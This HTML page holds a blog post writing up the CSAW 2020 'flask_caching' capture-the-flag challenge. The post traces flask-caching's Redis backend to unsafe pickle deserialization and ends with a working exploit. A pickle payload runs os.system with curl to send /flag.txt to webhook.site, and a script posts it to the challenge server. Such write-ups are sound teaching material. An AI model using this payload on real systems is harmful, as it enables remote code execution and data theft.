<!DOCTYPE html>
<html lang="en-us">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> CSAW Qualifiers 2020 - flask_caching | José Duarte</title>
  <meta name="description" content="Hello, I am José and on the internet I am known as crit. I am a MSc student at FCT-NOVA and a CTF player at RootLee. In interests revolve around music, photography and computers.">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="CSAW Qualifiers 2020 - flask_caching" />
<meta property="og:description" content="We were presented with a simple Flask server, we can see the code bellow (see the full code).
#!/usr/bin/env python3 from flask import Flask from flask import request, redirect from flask_caching import Cache from redis import Redis import jinja2 import os app = Flask(__name__) app.config[&#39;CACHE_REDIS_HOST&#39;] = &#39;localhost&#39; app.config[&#39;DEBUG&#39;] = False cache = Cache(app, config={&#39;CACHE_TYPE&#39;: &#39;redis&#39;}) redis = Redis(&#39;localhost&#39;) jinja_env = jinja2.Environment(autoescape=[&#39;html&#39;, &#39;xml&#39;]) @app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) def notes_post(): if request.method == &#39;GET&#39;: return &#39;&#39;&#39; &lt;h4&gt;Post a note&lt;/h4&gt; &lt;form method=POST enctype=multipart/form-data&gt; &lt;input name=title placeholder=title&gt; &lt;input type=file name=content placeholder=content&gt; &lt;input type=submit&gt; &lt;/form&gt; &#39;&#39;&#39; print(request." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://jmg-duarte.github.io/posts/ctfs/csaw/qualifiers/flask_caching/" />
<meta property="article:published_time" content="2020-09-14T21:15:03+01:00" />
<meta property="article:modified_time" content="2020-09-14T21:15:03+01:00" />

  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CSAW Qualifiers 2020 - flask_caching"/>
<meta name="twitter:description" content="We were presented with a simple Flask server, we can see the code bellow (see the full code).
#!/usr/bin/env python3 from flask import Flask from flask import request, redirect from flask_caching import Cache from redis import Redis import jinja2 import os app = Flask(__name__) app.config[&#39;CACHE_REDIS_HOST&#39;] = &#39;localhost&#39; app.config[&#39;DEBUG&#39;] = False cache = Cache(app, config={&#39;CACHE_TYPE&#39;: &#39;redis&#39;}) redis = Redis(&#39;localhost&#39;) jinja_env = jinja2.Environment(autoescape=[&#39;html&#39;, &#39;xml&#39;]) @app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) def notes_post(): if request.method == &#39;GET&#39;: return &#39;&#39;&#39; &lt;h4&gt;Post a note&lt;/h4&gt; &lt;form method=POST enctype=multipart/form-data&gt; &lt;input name=title placeholder=title&gt; &lt;input type=file name=content placeholder=content&gt; &lt;input type=submit&gt; &lt;/form&gt; &#39;&#39;&#39; print(request."/>

  
  
    
  
  
  <link rel="stylesheet" href="https://jmg-duarte.github.io/css/style-white.css">
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="https://jmg-duarte.github.io/images/favicon.ico" />

  
</head>
<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

  <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/about">About</a></li>
         
        <li><a href="/posts">Posts</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li>
          <a class="icon" href=" https://jmg-duarte.github.io/posts/ctfs/angstrom/caasio/">
            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
          </a>
        </li>
        
        
        <li>
          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
          </a>
        </li>
        <li>
          <a class="icon" href="#">
            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
          </a>
        </li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fctfs%2fcsaw%2fqualifiers%2fflask_caching%2f">
      <i class="fab fa-facebook " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fctfs%2fcsaw%2fqualifiers%2fflask_caching%2f&text=CSAW%20Qualifiers%202020%20-%20flask_caching">
      <i class="fab fa-twitter " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fctfs%2fcsaw%2fqualifiers%2fflask_caching%2f&title=CSAW%20Qualifiers%202020%20-%20flask_caching">
      <i class="fab fa-linkedin " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fctfs%2fcsaw%2fqualifiers%2fflask_caching%2f&is_video=false&description=CSAW%20Qualifiers%202020%20-%20flask_caching">
      <i class="fab fa-pinterest " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=CSAW%20Qualifiers%202020%20-%20flask_caching&body=Check out this article: https%3a%2f%2fjmg-duarte.github.io%2fposts%2fctfs%2fcsaw%2fqualifiers%2fflask_caching%2f">
      <i class="fas fa-envelope " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fctfs%2fcsaw%2fqualifiers%2fflask_caching%2f&title=CSAW%20Qualifiers%202020%20-%20flask_caching">
      <i class="fab fa-get-pocket " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fctfs%2fcsaw%2fqualifiers%2fflask_caching%2f&title=CSAW%20Qualifiers%202020%20-%20flask_caching">
      <i class="fab fa-reddit " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fctfs%2fcsaw%2fqualifiers%2fflask_caching%2f&title=CSAW%20Qualifiers%202020%20-%20flask_caching">
      <i class="fab fa-stumbleupon " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://digg.com/submit?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fctfs%2fcsaw%2fqualifiers%2fflask_caching%2f&title=CSAW%20Qualifiers%202020%20-%20flask_caching">
      <i class="fab fa-digg " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fctfs%2fcsaw%2fqualifiers%2fflask_caching%2f&name=CSAW%20Qualifiers%202020%20-%20flask_caching&description=We%20were%20presented%20with%20a%20simple%20Flask%20server%2c%20we%20can%20see%20the%20code%20bellow%20%28see%20the%20full%20code%29.%0a%23%21%2fusr%2fbin%2fenv%20python3%20from%20flask%20import%20Flask%20from%20flask%20import%20request%2c%20redirect%20from%20flask_caching%20import%20Cache%20from%20redis%20import%20Redis%20import%20jinja2%20import%20os%20app%20%3d%20Flask%28__name__%29%20app.config%5b%26%2339%3bCACHE_REDIS_HOST%26%2339%3b%5d%20%3d%20%26%2339%3blocalhost%26%2339%3b%20app.config%5b%26%2339%3bDEBUG%26%2339%3b%5d%20%3d%20False%20cache%20%3d%20Cache%28app%2c%20config%3d%7b%26%2339%3bCACHE_TYPE%26%2339%3b%3a%20%26%2339%3bredis%26%2339%3b%7d%29%20redis%20%3d%20Redis%28%26%2339%3blocalhost%26%2339%3b%29%20jinja_env%20%3d%20jinja2.Environment%28autoescape%3d%5b%26%2339%3bhtml%26%2339%3b%2c%20%26%2339%3bxml%26%2339%3b%5d%29%20%40app.route%28%26%2339%3b%2f%26%2339%3b%2c%20methods%3d%5b%26%2339%3bGET%26%2339%3b%2c%20%26%2339%3bPOST%26%2339%3b%5d%29%20def%20notes_post%28%29%3a%20if%20request.method%20%3d%3d%20%26%2339%3bGET%26%2339%3b%3a%20return%20%26%2339%3b%26%2339%3b%26%2339%3b%20%26lt%3bh4%26gt%3bPost%20a%20note%26lt%3b%2fh4%26gt%3b%20%26lt%3bform%20method%3dPOST%20enctype%3dmultipart%2fform-data%26gt%3b%20%26lt%3binput%20name%3dtitle%20placeholder%3dtitle%26gt%3b%20%26lt%3binput%20type%3dfile%20name%3dcontent%20placeholder%3dcontent%26gt%3b%20%26lt%3binput%20type%3dsubmit%26gt%3b%20%26lt%3b%2fform%26gt%3b%20%26%2339%3b%26%2339%3b%26%2339%3b%20print%28request.">
      <i class="fab fa-tumblr " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fctfs%2fcsaw%2fqualifiers%2fflask_caching%2f&t=CSAW%20Qualifiers%202020%20-%20flask_caching">
      <i class="fab fa-hacker-news " aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>
    <div id="toc">
      <nav id="TableOfContents"></nav>
    </div>
  </span>
</div>


  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
    <header>
      <h1 class="posttitle" itemprop="name headline">
        CSAW Qualifiers 2020 - flask_caching
      </h1>
      <div class="meta">
        
        <div class="postdate">
          
          <time datetime="2020-09-14 21:15:03 &#43;0100 &#43;0100" itemprop="datePublished">2020-09-14</time>
          
        </div>
        
        
      </div>
    </header>

  
    <div class="content" itemprop="articleBody">
      <p>We were presented with a simple Flask server,
we can see the code bellow (see the <a href="/ctf/csaw/qualifiers/app.py">full code</a>).</p>
<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>

<span style="color:#f92672">from</span> <span style="color:#111">flask</span> <span style="color:#f92672">import</span> <span style="color:#111">Flask</span>
<span style="color:#f92672">from</span> <span style="color:#111">flask</span> <span style="color:#f92672">import</span> <span style="color:#111">request</span><span style="color:#111">,</span> <span style="color:#111">redirect</span>
<span style="color:#f92672">from</span> <span style="color:#111">flask_caching</span> <span style="color:#f92672">import</span> <span style="color:#111">Cache</span>
<span style="color:#f92672">from</span> <span style="color:#111">redis</span> <span style="color:#f92672">import</span> <span style="color:#111">Redis</span>
<span style="color:#f92672">import</span> <span style="color:#111">jinja2</span>
<span style="color:#f92672">import</span> <span style="color:#111">os</span>

<span style="color:#111">app</span> <span style="color:#f92672">=</span> <span style="color:#111">Flask</span><span style="color:#111">(</span><span style="color:#111">__name__</span><span style="color:#111">)</span>
<span style="color:#111">app</span><span style="color:#f92672">.</span><span style="color:#111">config</span><span style="color:#111">[</span><span style="color:#d88200">&#39;CACHE_REDIS_HOST&#39;</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#39;localhost&#39;</span>
<span style="color:#111">app</span><span style="color:#f92672">.</span><span style="color:#111">config</span><span style="color:#111">[</span><span style="color:#d88200">&#39;DEBUG&#39;</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#111">False</span>

<span style="color:#111">cache</span> <span style="color:#f92672">=</span> <span style="color:#111">Cache</span><span style="color:#111">(</span><span style="color:#111">app</span><span style="color:#111">,</span> <span style="color:#111">config</span><span style="color:#f92672">=</span><span style="color:#111">{</span><span style="color:#d88200">&#39;CACHE_TYPE&#39;</span><span style="color:#111">:</span> <span style="color:#d88200">&#39;redis&#39;</span><span style="color:#111">})</span>
<span style="color:#111">redis</span> <span style="color:#f92672">=</span> <span style="color:#111">Redis</span><span style="color:#111">(</span><span style="color:#d88200">&#39;localhost&#39;</span><span style="color:#111">)</span>
<span style="color:#111">jinja_env</span> <span style="color:#f92672">=</span> <span style="color:#111">jinja2</span><span style="color:#f92672">.</span><span style="color:#111">Environment</span><span style="color:#111">(</span><span style="color:#111">autoescape</span><span style="color:#f92672">=</span><span style="color:#111">[</span><span style="color:#d88200">&#39;html&#39;</span><span style="color:#111">,</span> <span style="color:#d88200">&#39;xml&#39;</span><span style="color:#111">])</span>


<span style="color:#75af00">@app.route</span><span style="color:#111">(</span><span style="color:#d88200">&#39;/&#39;</span><span style="color:#111">,</span> <span style="color:#111">methods</span><span style="color:#f92672">=</span><span style="color:#111">[</span><span style="color:#d88200">&#39;GET&#39;</span><span style="color:#111">,</span> <span style="color:#d88200">&#39;POST&#39;</span><span style="color:#111">])</span>
<span style="color:#00a8c8">def</span> <span style="color:#75af00">notes_post</span><span style="color:#111">():</span>
    <span style="color:#00a8c8">if</span> <span style="color:#111">request</span><span style="color:#f92672">.</span><span style="color:#111">method</span> <span style="color:#f92672">==</span> <span style="color:#d88200">&#39;GET&#39;</span><span style="color:#111">:</span>
        <span style="color:#00a8c8">return</span> <span style="color:#d88200">&#39;&#39;&#39;
</span><span style="color:#d88200">        &lt;h4&gt;Post a note&lt;/h4&gt;
</span><span style="color:#d88200">        &lt;form method=POST enctype=multipart/form-data&gt;
</span><span style="color:#d88200">        &lt;input name=title placeholder=title&gt;
</span><span style="color:#d88200">        &lt;input type=file name=content placeholder=content&gt;
</span><span style="color:#d88200">        &lt;input type=submit&gt;
</span><span style="color:#d88200">        &lt;/form&gt;
</span><span style="color:#d88200">        &#39;&#39;&#39;</span>

    <span style="color:#00a8c8">print</span><span style="color:#111">(</span><span style="color:#111">request</span><span style="color:#f92672">.</span><span style="color:#111">form</span><span style="color:#111">,</span> <span style="color:#111">flush</span><span style="color:#f92672">=</span><span style="color:#111">True</span><span style="color:#111">)</span>
    <span style="color:#00a8c8">print</span><span style="color:#111">(</span><span style="color:#111">request</span><span style="color:#f92672">.</span><span style="color:#111">files</span><span style="color:#111">,</span> <span style="color:#111">flush</span><span style="color:#f92672">=</span><span style="color:#111">True</span><span style="color:#111">)</span>
    <span style="color:#111">title</span> <span style="color:#f92672">=</span> <span style="color:#111">request</span><span style="color:#f92672">.</span><span style="color:#111">form</span><span style="color:#f92672">.</span><span style="color:#111">get</span><span style="color:#111">(</span><span style="color:#d88200">&#39;title&#39;</span><span style="color:#111">,</span> <span style="color:#111">default</span><span style="color:#f92672">=</span><span style="color:#111">None</span><span style="color:#111">)</span>
    <span style="color:#111">content</span> <span style="color:#f92672">=</span> <span style="color:#111">request</span><span style="color:#f92672">.</span><span style="color:#111">files</span><span style="color:#f92672">.</span><span style="color:#111">get</span><span style="color:#111">(</span><span style="color:#d88200">&#39;content&#39;</span><span style="color:#111">,</span> <span style="color:#111">default</span><span style="color:#f92672">=</span><span style="color:#111">None</span><span style="color:#111">)</span>

    <span style="color:#00a8c8">if</span> <span style="color:#111">title</span> <span style="color:#f92672">is</span> <span style="color:#111">None</span> <span style="color:#f92672">or</span> <span style="color:#111">content</span> <span style="color:#f92672">is</span> <span style="color:#111">None</span><span style="color:#111">:</span>
        <span style="color:#00a8c8">return</span> <span style="color:#d88200">&#39;Missing fields&#39;</span><span style="color:#111">,</span> <span style="color:#ae81ff">400</span>

    <span style="color:#111">content</span> <span style="color:#f92672">=</span> <span style="color:#111">content</span><span style="color:#f92672">.</span><span style="color:#111">stream</span><span style="color:#f92672">.</span><span style="color:#111">read</span><span style="color:#111">()</span>

    <span style="color:#00a8c8">if</span> <span style="color:#111">len</span><span style="color:#111">(</span><span style="color:#111">title</span><span style="color:#111">)</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100</span> <span style="color:#f92672">or</span> <span style="color:#111">len</span><span style="color:#111">(</span><span style="color:#111">content</span><span style="color:#111">)</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">256</span><span style="color:#111">:</span>
        <span style="color:#00a8c8">return</span> <span style="color:#d88200">&#39;Too long&#39;</span><span style="color:#111">,</span> <span style="color:#ae81ff">400</span>

    <span style="color:#111">redis</span><span style="color:#f92672">.</span><span style="color:#111">setex</span><span style="color:#111">(</span><span style="color:#111">name</span><span style="color:#f92672">=</span><span style="color:#111">title</span><span style="color:#111">,</span> <span style="color:#111">value</span><span style="color:#f92672">=</span><span style="color:#111">content</span><span style="color:#111">,</span> <span style="color:#111">time</span><span style="color:#f92672">=</span><span style="color:#ae81ff">10</span><span style="color:#111">)</span>  <span style="color:#75715e"># Note will only live for max 30 seconds</span>

    <span style="color:#00a8c8">return</span> <span style="color:#d88200">&#39;Thanks!&#39;</span>


<span style="color:#75715e"># This caching stuff is cool! Lets make a bunch of cached functions.</span>

<span style="color:#75af00">@cache.cached</span><span style="color:#111">(</span><span style="color:#111">timeout</span><span style="color:#f92672">=</span><span style="color:#ae81ff">10</span><span style="color:#111">)</span>
<span style="color:#00a8c8">def</span> <span style="color:#75af00">_test0</span><span style="color:#111">():</span>
    <span style="color:#00a8c8">return</span> <span style="color:#d88200">&#39;test&#39;</span>
<span style="color:#75af00">@app.route</span><span style="color:#111">(</span><span style="color:#d88200">&#39;/test0&#39;</span><span style="color:#111">)</span>
<span style="color:#00a8c8">def</span> <span style="color:#75af00">test0</span><span style="color:#111">():</span>
    <span style="color:#111">_test0</span><span style="color:#111">()</span>
    <span style="color:#00a8c8">return</span> <span style="color:#d88200">&#39;test&#39;</span>

<span style="color:#00a8c8">if</span> <span style="color:#111">__name__</span> <span style="color:#f92672">==</span> <span style="color:#d88200">&#34;__main__&#34;</span><span style="color:#111">:</span>
    <span style="color:#111">app</span><span style="color:#f92672">.</span><span style="color:#111">run</span><span style="color:#111">(</span><span style="color:#d88200">&#39;0.0.0.0&#39;</span><span style="color:#111">,</span> <span style="color:#ae81ff">5000</span><span style="color:#111">)</span>
</code></pre></div><p>Analyzing the code, top to bottom we see that the server uses Redis as a cache, no big deal with that.
However, the way it is being used is weird.</p>
<p>Whenever a new note is being posted,
the &ldquo;raw&rdquo; operation is used,
however when using the test endpoints the calls are wrapped with the <code>@cache.cached</code> decorator.</p>
<p>Furthermore, the test endpoints always return <code>'test'</code> so even if we store something there we will not have direct feedback.</p>
<p>Following the decorator rabbit hole to the <a href="https://github.com/sh4nks/flask-caching/blob/9bd8365aa5bac9fb91e9e7ddc663ff087a97ab7a/flask_caching/backends/rediscache.py#L112-L115"><code>rediscache.py</code></a> we find the following:</p>
<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#00a8c8">def</span> <span style="color:#75af00">get</span><span style="color:#111">(</span><span style="color:#111">self</span><span style="color:#111">,</span> <span style="color:#111">key</span><span style="color:#111">):</span>
    <span style="color:#00a8c8">return</span> <span style="color:#111">self</span><span style="color:#f92672">.</span><span style="color:#111">load_object</span><span style="color:#111">(</span>
        <span style="color:#111">self</span><span style="color:#f92672">.</span><span style="color:#111">_read_clients</span><span style="color:#f92672">.</span><span style="color:#111">get</span><span style="color:#111">(</span><span style="color:#111">self</span><span style="color:#f92672">.</span><span style="color:#111">_get_prefix</span><span style="color:#111">()</span> <span style="color:#f92672">+</span> <span style="color:#111">key</span><span style="color:#111">)</span>
    <span style="color:#111">)</span>
</code></pre></div><p>And following the <code>load_object</code>:</p>
<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#00a8c8">def</span> <span style="color:#75af00">load_object</span><span style="color:#111">(</span><span style="color:#111">self</span><span style="color:#111">,</span> <span style="color:#111">value</span><span style="color:#111">):</span>
    <span style="color:#d88200">&#34;&#34;&#34;The reversal of :meth:`dump_object`.  This might be called with
</span><span style="color:#d88200">    None.
</span><span style="color:#d88200">    &#34;&#34;&#34;</span>
    <span style="color:#00a8c8">if</span> <span style="color:#111">value</span> <span style="color:#f92672">is</span> <span style="color:#111">None</span><span style="color:#111">:</span>
        <span style="color:#00a8c8">return</span> <span style="color:#111">None</span>
    <span style="color:#00a8c8">if</span> <span style="color:#111">value</span><span style="color:#f92672">.</span><span style="color:#111">startswith</span><span style="color:#111">(</span><span style="color:#d88200">b</span><span style="color:#d88200">&#34;!&#34;</span><span style="color:#111">):</span>
        <span style="color:#00a8c8">try</span><span style="color:#111">:</span>
            <span style="color:#00a8c8">return</span> <span style="color:#111">pickle</span><span style="color:#f92672">.</span><span style="color:#111">loads</span><span style="color:#111">(</span><span style="color:#111">value</span><span style="color:#111">[</span><span style="color:#ae81ff">1</span><span style="color:#111">:])</span>
        <span style="color:#00a8c8">except</span> <span style="color:#111">pickle</span><span style="color:#f92672">.</span><span style="color:#111">PickleError</span><span style="color:#111">:</span>
            <span style="color:#00a8c8">return</span> <span style="color:#111">None</span>
    <span style="color:#00a8c8">try</span><span style="color:#111">:</span>
        <span style="color:#00a8c8">return</span> <span style="color:#111">int</span><span style="color:#111">(</span><span style="color:#111">value</span><span style="color:#111">)</span>
    <span style="color:#00a8c8">except</span> <span style="color:#75af00">ValueError</span><span style="color:#111">:</span>
        <span style="color:#75715e"># before 0.8 we did not have serialization.  Still support that.</span>
        <span style="color:#00a8c8">return</span> <span style="color:#111">value</span>
</code></pre></div><p>Seeing <code>pickle.loads</code> means we have a winner.</p>
<p>According to the <a href="https://docs.python.org/3/library/pickle.html">documentation</a>:</p>
<blockquote>
<p>Warning</p>
<p>The pickle module is not secure. Only unpickle data you trust.</p>
<p>It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never unpickle data that could have come from an untrusted source, or that could have been tampered with.</p>
</blockquote>
<p>Triggering the deserialization is easy,
just start the content with <code>!</code> and the cache will take care of the rest for use.</p>
<p>Now we just need to create a payload and find the cache key.</p>
<p>First, the cache key as it is the easiest part.</p>
<ul>
<li>Run <code>app.py</code> with a Redis instance (increase the cache timer if necessary).</li>
<li>Send a GET request to one of the test endpoints.</li>
<li>Use <code>redis-cli</code> to retrieve all stored keys with <code>redis-cli keys &quot;*&quot;</code>.</li>
<li>You now know the key is <code>flask_cache_view//testN</code> where <code>N</code> is the test endpoint number.</li>
</ul>
<p>We now move on to the pickle.</p>
<p>With a quick search we find that this is called pickle shellcode,
the idea is to serialize a pickle with executes code on deserialization.</p>
<p>I found <a href="https://gist.github.com/0xBADCA7/f4c700fcbb5fb8785c14">this GitHub gist</a> which shows a &ldquo;framework&rdquo; to write &ldquo;bad&rdquo; pickles.</p>
<p>From there we write our exploit class:</p>
<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#00a8c8">class</span> <span style="color:#75af00">Exploit</span><span style="color:#111">():</span>
    <span style="color:#00a8c8">def</span> <span style="color:#75af00">__reduce__</span><span style="color:#111">(</span><span style="color:#111">self</span><span style="color:#111">):</span>
        <span style="color:#00a8c8">return</span> <span style="color:#111">(</span><span style="color:#111">os</span><span style="color:#f92672">.</span><span style="color:#111">system</span><span style="color:#111">,</span> <span style="color:#111">(</span><span style="color:#d88200">&#39;curl https://webhook.site/&lt;id&gt;?flag=`cat /flag.txt`&#39;</span><span style="color:#111">,</span> <span style="color:#111">))</span>
</code></pre></div><p>This works because <code>pickle</code> allows objects to decide how to be pickled using the <code>__reduce__</code> method,
hence we return a tuple of a <code>callable</code> and its arguments.</p>
<p>Using <code>os.system</code> we can launch an arbitrary process,
I used <code>curl</code> to send a request to <code>webhook.site</code> with the flag as a query parameter.</p>
<p>Now we just <a href="/ctf/csaw/qualifiers/exploit.py">automate</a> the whole process,
serializing the Exploit object to bytes,
send the bytes as a file and request the test endpoint.</p>
<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#111">url</span> <span style="color:#f92672">=</span> <span style="color:#d88200">&#34;http://web.chal.csaw.io:5000/&#34;</span>

<span style="color:#00a8c8">class</span> <span style="color:#75af00">Exploit</span><span style="color:#111">():</span>
    <span style="color:#00a8c8">def</span> <span style="color:#75af00">__reduce__</span><span style="color:#111">(</span><span style="color:#111">self</span><span style="color:#111">):</span>
        <span style="color:#00a8c8">return</span> <span style="color:#111">(</span><span style="color:#111">os</span><span style="color:#f92672">.</span><span style="color:#111">system</span><span style="color:#111">,</span> <span style="color:#111">(</span><span style="color:#d88200">&#39;curl https://webhook.site/127d80d9-c737-44fe-95b3-c053849634a5?flag=`cat /flag.txt`&#39;</span><span style="color:#111">,</span> <span style="color:#111">))</span>

<span style="color:#111">bad_pickle</span> <span style="color:#f92672">=</span> <span style="color:#d88200">b</span><span style="color:#d88200">&#34;!&#34;</span> <span style="color:#f92672">+</span> <span style="color:#111">pickle</span><span style="color:#f92672">.</span><span style="color:#111">dumps</span><span style="color:#111">(</span><span style="color:#111">Exploit</span><span style="color:#111">())</span>
<span style="color:#111">requests</span><span style="color:#f92672">.</span><span style="color:#111">post</span><span style="color:#111">(</span><span style="color:#111">url</span><span style="color:#111">,</span>
    <span style="color:#111">data</span><span style="color:#f92672">=</span><span style="color:#111">{</span><span style="color:#d88200">&#34;title&#34;</span><span style="color:#111">:</span><span style="color:#d88200">&#34;flask_cache_view//test0&#34;</span><span style="color:#111">},</span>
    <span style="color:#111">files</span><span style="color:#f92672">=</span><span style="color:#111">{</span><span style="color:#d88200">&#34;content&#34;</span><span style="color:#111">:</span><span style="color:#111">bad_pickle</span><span style="color:#111">})</span>
<span style="color:#111">requests</span><span style="color:#f92672">.</span><span style="color:#111">get</span><span style="color:#111">(</span><span style="color:#111">url</span> <span style="color:#f92672">+</span> <span style="color:#d88200">&#34;/test0&#34;</span><span style="color:#111">)</span>
</code></pre></div>
    </div>
  </article>

  
  





  <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about">About</a></li>
         
          <li><a href="/posts">Posts</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <nav id="TableOfContents"></nav>
    </div>

    <div id="share-footer" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fctfs%2fcsaw%2fqualifiers%2fflask_caching%2f">
      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fctfs%2fcsaw%2fqualifiers%2fflask_caching%2f&text=CSAW%20Qualifiers%202020%20-%20flask_caching">
      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fctfs%2fcsaw%2fqualifiers%2fflask_caching%2f&title=CSAW%20Qualifiers%202020%20-%20flask_caching">
      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fctfs%2fcsaw%2fqualifiers%2fflask_caching%2f&is_video=false&description=CSAW%20Qualifiers%202020%20-%20flask_caching">
      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=CSAW%20Qualifiers%202020%20-%20flask_caching&body=Check out this article: https%3a%2f%2fjmg-duarte.github.io%2fposts%2fctfs%2fcsaw%2fqualifiers%2fflask_caching%2f">
      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fctfs%2fcsaw%2fqualifiers%2fflask_caching%2f&title=CSAW%20Qualifiers%202020%20-%20flask_caching">
      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fctfs%2fcsaw%2fqualifiers%2fflask_caching%2f&title=CSAW%20Qualifiers%202020%20-%20flask_caching">
      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fctfs%2fcsaw%2fqualifiers%2fflask_caching%2f&title=CSAW%20Qualifiers%202020%20-%20flask_caching">
      <i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
